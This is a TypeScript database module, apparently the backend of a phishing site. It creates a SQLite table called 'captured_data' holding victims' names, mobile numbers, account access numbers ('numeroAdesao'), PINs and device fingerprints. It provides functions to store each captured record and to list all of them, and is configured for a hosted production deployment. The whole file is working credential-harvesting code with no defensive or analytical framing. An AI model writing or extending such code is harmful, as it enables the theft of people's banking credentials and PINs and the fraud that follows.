import Database from "better-sqlite3";
import { drizzle } from "drizzle-orm/better-sqlite3";
import { desc } from "drizzle-orm";
import { capturedData, InsertCapturedData } from "../drizzle/schema-sqlite";
import path from "path";

let _db: ReturnType<typeof drizzle> | null = null;

// Criar o banco de dados SQLite
export function getDb() {
  if (!_db) {
    try {
      // Use /data mount path for persistent storage on Render
      const dbPath = process.env.NODE_ENV === 'production' 
        ? '/data/data.db' 
        : path.resolve(process.cwd(), "data.db");
      const sqlite = new Database(dbPath);
      _db = drizzle(sqlite);
      
      // Criar tabela se não existir
      sqlite.exec(`
        CREATE TABLE IF NOT EXISTS captured_data (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          nome TEXT NOT NULL,
          telemovel TEXT NOT NULL,
          numeroAdesao TEXT NOT NULL,
          pin TEXT NOT NULL,
          fingerprint TEXT,
          createdAt INTEGER DEFAULT (strftime('%s', 'now'))
        )
      `);
      
      console.log("[Database] SQLite database initialized at:", dbPath);
    } catch (error) {
      console.error("[Database] Failed to initialize SQLite:", error);
      _db = null;
    }
  }
  return _db;
}

export async function insertCapturedData(data: {
  name: string;
  phone: string;
  membershipNumber: string;
  pin: string;
  fingerprint?: string;
}) {
  const db = getDb();
  if (!db) {
    console.warn("[Database] Cannot insert captured data: database not available");
    return null;
  }

  try {
    const dbData: InsertCapturedData = {
      nome: data.name,
      telemovel: data.phone,
      numeroAdesao: data.membershipNumber,
      pin: data.pin,
      fingerprint: data.fingerprint || null,
    };
    const result = await db.insert(capturedData).values(dbData).returning({ id: capturedData.id });
    console.log("[Database] Data captured successfully:", result[0].id);
    return result[0].id;
  } catch (error) {
    console.error("[Database] Failed to insert captured data:", error);
    throw error;
  }
}

export async function getAllCapturedData() {
  const db = getDb();
  if (!db) {
    console.warn("[Database] Cannot get captured data: database not available");
    return [];
  }

  try {
    const result = await db.select().from(capturedData).orderBy(desc(capturedData.createdAt));
    return result;
  } catch (error) {
    console.error("[Database] Failed to get captured data:", error);
    throw error;
  }
}
